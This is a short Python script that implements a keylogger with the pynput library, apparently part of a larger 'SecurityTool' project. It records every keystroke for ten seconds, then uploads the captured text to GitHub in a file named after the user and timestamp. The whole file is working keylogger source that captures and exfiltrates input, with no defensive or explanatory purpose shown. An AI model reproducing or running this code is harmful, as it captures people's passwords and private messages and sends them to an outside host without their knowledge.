from datetime import datetime
import time
from pynput import keyboard
from test_main import SecurityTool


class Keylogger(SecurityTool):
    def __init__(self):
        super().__init__()
        self.log = []
        self.output = ""
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.log.append(key.char)
                self.output += key.char
            else:
                special_key = f"[{key}]"
                self.log.append(special_key)
                self.output += special_key
        except Exception as e:
            self.log_error(f"Error processing key press: {e}")

    def start(self):
        self.listener.start()

    def stop(self):
        self.listener.stop()

    @staticmethod
    def log_error(message):
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"{datetime.now()}: {message}\n")

    def save_and_upload(self):
        file_path = f"data/keylogger_{self.username}_{self.current_time}.txt"
        self.push_to_github(file_path, self.output, "Updated keylogger data")


keylogger = Keylogger()
keylogger.start()
time.sleep(10)  # Run for 10 seconds
keylogger.stop()
keylogger.save_and_upload()
